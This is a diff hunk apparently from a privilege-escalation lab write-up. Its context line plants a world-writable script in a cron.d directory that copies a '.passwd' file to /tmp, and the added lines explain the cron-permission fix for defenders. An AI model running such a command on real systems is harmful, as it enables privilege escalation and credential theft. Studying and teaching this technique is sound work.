@@ -21,3 +21,7 @@ echo '#!/bin/sh\ncat .passwd > /tmp/whatever' > cron.d/task1;chmod 4777 cron.d/t
 ```
 
 Wait for it and cat `/tmp/whatever`.
+
+## Counter moves
+
+A cron job running attacker-controlled script is the escalation here. Locking cron ownership and permissions removes it. Defenders' notes on this are under [the gap between access and authority](https://blue.tymyrddin.dev/docs/counter/escalation/).
